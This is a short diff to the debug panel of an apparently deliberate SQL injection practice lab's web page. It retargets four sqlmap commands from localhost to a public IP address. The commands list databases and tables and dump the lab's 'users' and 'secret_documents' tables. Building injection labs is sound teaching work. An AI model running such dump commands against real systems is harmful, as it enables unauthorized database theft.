@@ -97,10 +97,10 @@
             
             <div style="margin-top: 1rem; border-top: 1px solid #334155; padding-top: 0.5rem;">
                 <span class="debug-label">SQLMAP COMMANDS:</span>
-                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" --dbs</code>
-                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab --tables</code>
-                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab -T users --dump</code>
-                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab -T secret_documents --dump</code>
+                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://140.99.98.118:1337/lab_auto.php?id=1" --dbs</code>
+                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://140.99.98.118:1337/lab_auto.php?id=1" -D sqli_lab --tables</code>
+                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://140.99.98.118:1337/lab_auto.php?id=1" -D sqli_lab -T users --dump</code>
+                <code class="debug-code" style="font-size: 0.8em; opacity: 0.8;">sqlmap -u "http://140.99.98.118:1337/lab_auto.php?id=1" -D sqli_lab -T secret_documents --dump</code>
             </div>
         </div>
     </div>
